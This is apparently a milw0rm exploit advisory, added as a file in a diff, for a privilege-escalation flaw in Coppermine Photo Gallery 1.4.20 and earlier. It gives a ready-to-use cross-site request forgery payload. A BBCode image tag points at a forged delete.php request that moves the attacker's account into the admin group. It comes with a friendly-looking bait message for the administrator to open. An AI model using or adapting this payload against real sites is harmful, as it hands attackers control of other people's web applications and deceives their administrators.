@@ -1,0 +1,27 @@
++--------------------------------------------------------------------------+
+| Coppermine Photo Gallery <= 1.4.20 (BBCode IMG) Privilege Escalation PoC |
++--------------------------------------------------------------------------+
+| by Juri Gianni aka yeat - staker[at]hotmail[dot]it                       |
+| http://coppermine-gallery.net                                            |
+| Don't add me on msn messenger.                                           |
+| This vulnerability can be named as "bbcode img tag script injection"     |
++--------------------------------------------------------------------------+
+| Proof of Concept  (an example,to understand it)                          |
++--------------------------------------------------------------------------+
+ URL: http://[host]/[path]/delete.php?id=u[ID]&u[ID]=&action=change_group&what=user&new_password=&group=1&delete_files=no&delete_comments=no
+ [img]URL[/img]                                                           
++--------------------------------------------------------------------------+
+| Modify [ID] with your user id.                                           |
+| Go http://[host]/[path]/displayimage.php?album=random&pos=[album id]     |
++--------------------------------------------------------------------------+
+ Insert the below code into a new message
+ 
+ hey admin,nice web site :)
+ [img]http://[host]/[path]/delete.php?id=u3&u3=&action=change_group&what=user&new_password=&group=1&delete_files=no&delete_comments=no[/img]
+ 
++-------------------------------------------------------------------------+
+| The fake image doesn't show errors,you'll see "hey admin,nice web site" |
+| You'll become admin when the real admin will visit the page             |          
++-------------------------------------------------------------------------+
+
+# milw0rm.com [2009-02-26]
